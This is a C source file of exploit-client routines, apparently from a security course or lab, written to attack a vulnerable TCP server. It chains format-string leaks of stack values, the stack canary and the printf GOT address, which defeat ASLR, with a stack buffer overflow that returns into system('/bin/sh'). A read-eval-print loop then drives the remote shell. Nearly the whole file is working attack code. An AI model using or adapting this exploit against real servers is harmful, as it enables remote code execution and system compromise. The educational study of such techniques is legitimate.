/**
	Common routines for different clients
	
	sheisc@163.com
 */
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h> 
#include <signal.h>
#include <arpa/inet.h>
#include "util.h"

static void err_sig_handler(int sig){
	printf("The remote server might be down. Receive a signal from OS: %d \n",sig);
}

void do_error(const char *msg, ...) {
	perror(msg);
	exit(1);
}
/**
	Try to read reponses from the remote server without blocking.
 */
int get_and_prt(int sock,int debug){
	int sum = 0, n = 0;
	char recvBuf[1024*16];
	//
	int cnt = 0;

	memset(recvBuf,0,sizeof(recvBuf));
	while(cnt < MAX_TIMES){						
		usleep(TEST_INTERVAL_US);
		n = recv(sock, recvBuf, sizeof(recvBuf), MSG_DONTWAIT);
		if(n == 0){
			cnt++;			
		}else if(n < 0){
			//printf("sum = %d, n = %d \n",sum,n);
			if(sum > 0){
				return sum;
			}else{
				return n;
			}
		}else{
			//printf("%s",recvBuf);	
			if(debug & WITH_NORMAL_OUTPUT){
				write(1,recvBuf,n);
			}
			if(debug & WITH_ESCAPE_OUTPUT){
				print_bytes(recvBuf,n);
			}				
			sum += n;
			cnt = 0;
		}
	}
	return sum;
}

int do_it(int argc, char **argv,void (*request)(int)){
	int sock;
	struct sockaddr_in serv_addr;
	int port;

	if ( argc < 3) {
		printf("Please enter:	%s 127.0.0.1 8080 \n",argv[0]);
		return -1;
	}
	
	if ( ( sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP ) ) < 0 ) {
		do_error("socket() failed.");
	} 

	signal(SIGPIPE,err_sig_handler);
	port = atoi(argv[2]);

	
	memset( &serv_addr, 0, sizeof(serv_addr) );
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port = htons(port);
	inet_pton(AF_INET, argv[1], &serv_addr.sin_addr.s_addr);

	if ( (connect( sock, (struct sockaddr *) &serv_addr, sizeof(serv_addr))) < 0  ) {
		do_error("connect() failed.");
	}
	request(sock);
	close(sock);	
	return 0;
}
// 0x01 0x02 0x03 0x04  is printed as \x01\x02\x03\x04
void print_bytes(char * ptr,int n){
	int i;
	for(i = 0; i < n; i++){
		unsigned int n = ptr[i] & 0xff;
		printf("\\x%02x",n);
	}
	printf("\n");
}

/**
	\xFF -->  (char)0xFF

	During compiling time, C comiler can escape string literals "\xFF".
	However,at runtime, we do it by ourself.
	For example,		
		char buf[64];
		printf("%d\n",strlen("\x31")); // The length is 1
		fgets(buf,sizeof(buf),stdin);  // User Input: \x13ENTER_KEY
		printf("%d\n",strlen(buf));    // The length is 5 : 4 for \x13, 1 for ENTER_KEY

	We only need to support hexadecimal-escape-sequence.
	It is enough for our purpose.

	The result is also saved in @param input, that is , in-place escaping.
 */
int in_place_escape(char * input,int n){
	char tmp[16];
	int i,k;
	unsigned int val;
	//
	memset(tmp,0,sizeof(tmp));
	for(i = 0,k = 0; i < n && input[i]; i++,k++){
		if(input[i] == '\\' && input[i+1] == 'x'){	// '\xfe'			
			i += 2;			
			strncpy(tmp,input+i,2);
			tmp[2] = 0;
			sscanf(tmp,"%x",&val);
			input[k] = (unsigned char) val;
			i++;
		}else{
			input[k] = input[i];
		}
	}	
	input[k] = 0;
	return k;
}


unsigned int peek_x86_stack(int sock, unsigned int cnt){
		// make it large enough
	char buf[64];
	unsigned int val;

	memset(buf,0,sizeof(buf));
	// Since the buffer exploited on the target server is limited,
	//	We use 'direct parameter access' to lift the stack.
	//	%20$d
	sprintf(buf,"%%%d$08x \n",cnt);

	//printf("%s",buf);

	send( sock, buf, strlen(buf), 0);
	recv(sock, buf, sizeof(buf), 0);	 
	// We use sscanf() here. 
	// The output we get is pure ASCII, which is different from disclose_info() 
	sscanf(buf,"%x",&val);	
	return val;
}

unsigned int peek_stack_canary(int sock, unsigned int cnt){
	return peek_x86_stack(sock,cnt);
}

/**
	Send a packet to trigger a buffer flow on the target machine.
	It will overwrite the return address and call library function system("/bin/sh").
	Necessary information disclosure should be done before calling buffer_overflow().			
 */ 
void buffer_overflow(int sock,struct server_info * psi){
	char buf[512];
	int n;
	struct payload pload;
	//
	memset(buf,0,sizeof(buf));
	memset(pload.buf, 'x', TARGET_BUF_SIZE);	
	printf("TARGET_BUF_SIZE is %d \n",TARGET_BUF_SIZE);
#ifndef	NO_STACK_CANARIES
	*((unsigned int *)(pload.buf + CANARY_POSITION)) = psi->canary;
#endif
	pload.pre_ebp = DUMMY_VALUE;
	pload.fake_ret_addr = DUMMY_VALUE;
	pload.shell_entry = psi->system_func_addr;	
	pload.arg1 = psi->shell_str_addr;			
	pload.padding[0] = '\n';
	//pload.padding[1] = 0;
	
	// Send it to the poor server
	n = send( sock, &pload, pload.padding + 1 -((char *)&pload), 0);
	printf("send %d bytes \n", n);
	// Try to receive
	get_and_prt(sock,WITH_NORMAL_OUTPUT);
	
}

// Read Eval Print Loop
void REPL(int sock,int debug){
	char buf[4096];
	int n,i;
	printf("\n$");
	while(1){		
		
		memset(buf,0,sizeof(buf));
		fgets(buf,sizeof(buf),stdin);
		n = in_place_escape(buf,sizeof(buf));
		
		i = send( sock, &buf, n, 0);
		if(debug & WITH_ESCAPE_OUTPUT){		
			print_bytes(buf,i);
		}
		get_and_prt(sock,debug);
		
		printf("\n$");
	}
}



/**	
	We use format strings to disclose the information of GOT entry for printf.
	Even when ASLR is active, the relative offset between printf and system in 
	libc.so is a constant.
 */
void disclose_info(int sock, struct server_info * psi){
	char buf[512];  //FIXME: buffer overflow :)
	int n;
	unsigned int val;
	//unsigned int system_addr, shell_addr;
	char * ptr;
	// For example, if stack_lifting is 3,
	// (1) We can use three %08x here to increase the internal stack pointer of printf,
	// and then the fourth format parameter corresponds to 0x0804a004.
	//		./escape_client 127.0.0.1 8080
	//		\x04\xa0\x04\x08 %08x %08x %08x %08x
	// (2) 0x0804a004 is the address of GOT entry for printf
	//		objdump -R server		
	psi->stack_lifting = guess_stack_lifting(sock);
	//
	memset(buf,0,sizeof(buf));
	*((unsigned int *) buf) = psi->printf_got_addr;	
	ptr = buf + sizeof(unsigned int);
	for(n = 0; n < psi->stack_lifting; n++){
		strcat(ptr,STACK_LIFTING_STR);
	}
	strcat(ptr,"%s\n");	

	n = send( sock, buf, strlen(ptr)+sizeof(unsigned int), 0);

	recv(sock, buf, sizeof(buf), 0);	 
	
	// The address PRINTF_GOT_ADDR occupyies 4 bytes, each printed integer 8 bytes (%08x).
	val = *((unsigned int *) (buf + sizeof(unsigned int) + (8 * psi->stack_lifting))) ;

	unsigned int diff = val - psi->printf_func_addr;
	psi->system_func_addr += diff;
	psi->shell_str_addr += diff;
	//psi->system_func_addr = SYSTEM_FUNC_ADDR+(val-PRINTF_FUNC_ADDR);
	//psi->shell_str_addr = SHELL_STR_ADDR+(val-PRINTF_FUNC_ADDR);

	get_and_prt(sock,WITHOUT_OUTPUT);
}



/*
	If the return value, n , represents that we have got sequential n bytes starting from @address
 */
static int do_peek_remote_server(int sock, unsigned int address, char * receiveBuf, int len){
	char buf[4096];  //FIXME: buffer overflow :)
	int n;
	unsigned int val;
	//unsigned int system_addr, shell_addr;
	char * ptr;
	// For example, if stack_lifting is 3,
	// (1) We can use three %08x here to increase the internal stack pointer of printf,
	// and then the fourth format parameter corresponds to 0x0804a004.
	//		./escape_client 127.0.0.1 8080
	//		\x04\xa0\x04\x08 %08x %08x %08x %08x
	// (2) 0x0804a004 is the address of GOT entry for printf
	//		objdump -R server		
	int stack_lifting = guess_stack_lifting(sock);
	//
	memset(buf,0,sizeof(buf));
	*((unsigned int *) buf) = address;	
	ptr = buf + sizeof(unsigned int);
	for(n = 0; n < stack_lifting; n++){
		strcat(ptr,STACK_LIFTING_STR);
	}
#if 1	
	/*
		printf("%.2s\n", target);
			print at most 2 characters starting at target
	*/
	sprintf(ptr + stack_lifting * strlen(STACK_LIFTING_STR),"%%.%ds%s",len,MAGIC_STR);
	
	//printf("ptr is %s",ptr);

	send( sock, buf, strlen(ptr)+sizeof(unsigned int), 0);
	
	n = recv(sock, buf, sizeof(buf), 0);	
	
	int i = 0, cnt = 0;
	int prefixLen = sizeof(unsigned int) + (8 * stack_lifting);
	int pre_post_len = prefixLen + strlen(MAGIC_STR);
	if(n > pre_post_len){
		for(i = 0; i < n - pre_post_len && i < len; i++){
			receiveBuf[i] = buf[i + prefixLen];
		}
		cnt = i;		
	}else if(n == pre_post_len){
		if(strncmp(buf + prefixLen, MAGIC_STR, strlen(MAGIC_STR)) == 0){
			// get a 0x00 byte
			receiveBuf[0] = 0;
			cnt = 1;
		}else{
			cnt = 0;
		}

	}else{
		// try again.
		cnt = 0;
	}
	get_and_prt(sock,WITHOUT_OUTPUT);

	return cnt;
#endif
}

int peek_remote_server(int sock, unsigned int address, char * receiveBuf, int len){
	int n = 0;	 	
 	while(n < len){
 		int m = do_peek_remote_server(sock, address + n, receiveBuf + n, len - n);
 		//print_bytes(receiveBuf,n);
 		//printf("n = %d, m = %d \n\n", n, m);	 		 
 		n = n + m;	 		
 	}
 	return n;
}
/**
	Guess how many %08x we need to lift the stack pointer to the right position.	
 */
int guess_stack_lifting(int sock){
	struct{
		unsigned int magic_number;
		char fmt[1024];
	}pkt;
	int n,k;
	unsigned int val;
	char buf[1024];
	char * ptr;
	
	memset(buf,0,sizeof(buf));    
	pkt.magic_number = MAGIC_NUMBER;
	ptr = pkt.fmt;
	memset(ptr,0,sizeof(pkt.fmt));
	for(k = 1; k < MAX_GUESS_TIMES; k++){
		strcat(ptr,"%08x ");
		n = strlen(ptr);
		ptr[n] = '\n';	
		//printf("%s \n",ptr);
		send( sock, &pkt, strlen(ptr)+sizeof(pkt.magic_number), 0);		
		ptr[n] = 0;
		recv(sock, buf, sizeof(buf), 0);	 		
		for(n = 0; n < k; n++){
			//Skip the first 4 chars and "%08x " prints 9 chars
			sscanf(buf+4+n*9,"%x",&val);
			if(val == MAGIC_NUMBER){				
				return n;
			}
		}
	}
	return -1;
}

